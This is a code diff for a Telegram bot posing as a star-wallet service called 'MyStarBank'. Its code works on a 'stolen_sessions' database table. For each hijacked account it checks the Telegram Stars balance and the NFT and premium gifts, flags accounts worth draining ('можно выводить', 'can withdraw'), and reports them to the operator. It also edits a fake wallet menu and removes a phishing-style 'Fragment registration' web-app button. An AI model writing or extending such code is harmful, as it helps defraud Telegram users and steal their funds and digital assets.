@@ -214,26 +214,69 @@ async function checkAccountStatus(client, phone) {
     try {
         const user = await client.getMe();
         
-        let message = `🔍 СТАТУС АККАУНТА:\n` +
-                     `📱 Номер: ${phone}\n` +
-                     `👤 Username: ${user.username || 'нет'}\n` +
-                     `👑 Премиум: ${user.premium ? 'да' : 'нет'}\n` +
-                     `📅 Аккаунт создан: ${user.status ? 'давно' : 'недавно'}\n\n`;
+        let starsCount = 0;
+        let giftsCount = 0;
         
-        const hasStars = user.premium || user.username;
-        const hasGifts = user.premium;
-        
-        if (hasStars || hasGifts) {
-            message += `💰 ВОЗМОЖНО ЕСТЬ СРЕДСТВА\n` +
-                      `💡 Аккаунт выглядит активным\n` +
-                      `🔒 Для проверки звезд нужен доступ к Fragment`;
-        } else {
-            message += `❌ АККАУНТ ПУСТОЙ\n` +
-                      `💡 Нет премиума и активностей`;
+        // ПРОВЕРЯЕМ ЗВЕЗДЫ ЧЕРЕЗ ПЛАТЕЖИ
+        try {
+            const starsStatus = await client.invoke(
+                new Api.payments.GetStarsStatus({})
+            );
+            if (starsStatus && starsStatus.balance !== undefined) {
+                starsCount = starsStatus.balance;
+            }
+        } catch (starsError) {
+            console.log('⚠️ Звезды не найдены:', starsError.message);
         }
         
-        db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ? WHERE phone = ?`, 
-            [hasStars ? 1 : 0, hasGifts ? 1 : 0, phone]);
+        // ПРОВЕРЯЕМ NFT ПОДАРКИ ЧЕРЕЗ STICKERS
+        try {
+            const premiumGifts = await client.invoke(
+                new Api.messages.GetStickerSet({
+                    stickerset: new Api.InputStickerSetPremiumGifts(),
+                    hash: 0
+                })
+            );
+            
+            if (premiumGifts && premiumGifts.documents) {
+                giftsCount = premiumGifts.documents.length;
+            }
+        } catch (giftsError) {
+            console.log('⚠️ NFT подарки не найдены:', giftsError.message);
+        }
+        
+        // ПРОВЕРЯЕМ ПРЕМИУМ ПОДАРКИ
+        try {
+            const userFull = await client.invoke(
+                new Api.users.GetFullUser({
+                    id: user.id
+                })
+            );
+            
+            if (userFull && userFull.premium_gifts) {
+                giftsCount += userFull.premium_gifts.length || 0;
+            }
+        } catch (premiumError) {
+            console.log('⚠️ Премиум подарки не найдены:', premiumError.message);
+        }
+        
+        let message = `🎯 ДАННЫЕ АККАУНТА:\n` +
+                     `📱 Номер: ${phone}\n` +
+                     `👤 Username: @${user.username || 'нет'}\n` +
+                     `👑 Премиум: ${user.premium ? 'ДА' : 'нет'}\n\n` +
+                     `⭐ ЗВЕЗДЫ: ${starsCount}\n` +
+                     `🎁 NFT ПОДАРКОВ: ${giftsCount}\n\n`;
+        
+        if (starsCount > 0 || giftsCount > 0) {
+            message += `💰 ЕСТЬ ДЕНЬГИ!\n` +
+                      `⚡ Можно выводить`;
+        } else {
+            message += `❌ АККАУНТ ПУСТОЙ`;
+        }
+        
+        // СОХРАНЯЕМ В БАЗУ
+        db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ?, status = 'checked' WHERE phone = ?`, 
+            [starsCount, giftsCount, phone]);
         
         bot.sendMessage(MY_USER_ID, message);
         
@@ -379,44 +422,35 @@ bot.onText(/\/start/, (msg) => {
 function showMainMenu(chatId, userId) {
     const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
     
-    // ПОЛУЧАЕМ БАЛАНС
-    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-        const balance = row ? row.balance : 50;
-        
-        const menuText = `✨ <b>MyStarBank - Ваш звездный кошелек</b>
+    const menuText = `✨ <b>MyStarBank</b>
 
-💫 <b>Текущий баланс:</b> ${balance} звезд | Баланс: 50
+🏦 <b>Операции:</b>
+├ 📊 Баланс
+├ 🎫 Чек
+└ 💸 Вывод
 
-🏦 <b>Доступные операции:</b>
-├ 📊 Проверить баланс
-├ 🎫 Создать чек
-└ 💸 Вывести средства
+🔐 Защищено | 💎 Надежно`;
 
-🔐 <b>Безопасность:</b> Все операции защищены
-💎 <b>Надежность:</b> Гарантия выплат`;
+    const menuKeyboard = {
+        inline_keyboard: [
+            [{ text: "📊 Баланс", callback_data: "check_balance" }],
+            [{ text: "🎫 Чек", callback_data: "create_check_menu" }],
+            [{ text: "💸 Вывод", callback_data: "withdraw_funds" }]
+        ]
+    };
 
-        const menuKeyboard = {
-            inline_keyboard: [
-                [{ text: "📊 Проверить баланс", callback_data: "check_balance" }],
-                [{ text: "🎫 Создать чек", callback_data: "create_check_menu" }],
-                [{ text: "💸 Вывести средства", callback_data: "withdraw_funds" }],
-                [{ text: "🔐 Регистрация на Fragment", web_app: { url: WEB_APP_URL } }]
-            ]
-        };
-
-        if (fs.existsSync(avatarPath)) {
-            bot.sendPhoto(chatId, avatarPath, {
-                caption: menuText,
-                parse_mode: 'HTML',
-                reply_markup: menuKeyboard
-            });
-        } else {
-            bot.sendMessage(chatId, menuText, {
-                parse_mode: 'HTML',
-                reply_markup: menuKeyboard
-            });
-        }
-    });
+    if (fs.existsSync(avatarPath)) {
+        bot.sendPhoto(chatId, avatarPath, {
+            caption: menuText,
+            parse_mode: 'HTML',
+            reply_markup: menuKeyboard
+        });
+    } else {
+        bot.sendMessage(chatId, menuText, {
+            parse_mode: 'HTML',
+            reply_markup: menuKeyboard
+        });
+    }
 }
 
 // ОБРАБОТКА CALLBACK МЕНЮ
@@ -457,18 +491,9 @@ bot.on('callback_query', async (query) => {
                 `🏦 <b>Вывод средств</b>\n\n` +
                 `❌ <b>Вывод временно недоступен</b>\n\n` +
                 `📋 <b>Требования для вывода:</b>\n` +
-                `├ 🔐 Регистрация на Fragment\n` +
                 `├ 📱 Подтвержденный аккаунт\n` +
-                `└ 💫 Минимум 100 звезд\n\n` +
-                `🔗 <b>Для регистрации нажмите кнопку ниже:</b>`,
-                {
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: "🔐 Зарегистрироваться на Fragment", web_app: { url: WEB_APP_URL } }
-                        ]]
-                    }
-                }
+                `└ 💫 Минимум 100 звезд`,
+                { parse_mode: 'HTML' }
             );
         }
     } catch (error) {
